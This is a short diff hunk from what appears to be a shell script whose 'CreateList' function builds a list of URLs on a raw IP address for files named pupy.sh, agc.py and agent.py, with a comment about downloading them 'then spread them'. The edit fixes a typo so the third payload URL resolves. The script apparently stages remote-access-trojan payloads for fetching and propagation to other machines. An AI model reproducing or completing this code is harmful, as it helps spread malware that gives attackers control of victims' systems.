@@ -37,7 +37,7 @@ function CreateList
     #Notice: you can add your items  into this arraylist in case you want to download files from the internet then spread them
     arraylist[0]='http://35.221.117.19/pupy.sh'
     arraylist[1]='http://35.221.117.19/agc.py'
-    arraylist[2]='hhttp://35.221.117.19/agent.py'
+    arraylist[2]='http://35.221.117.19/agent.py'
    
 	
     #loop on the array and write the lines in the list.txt file
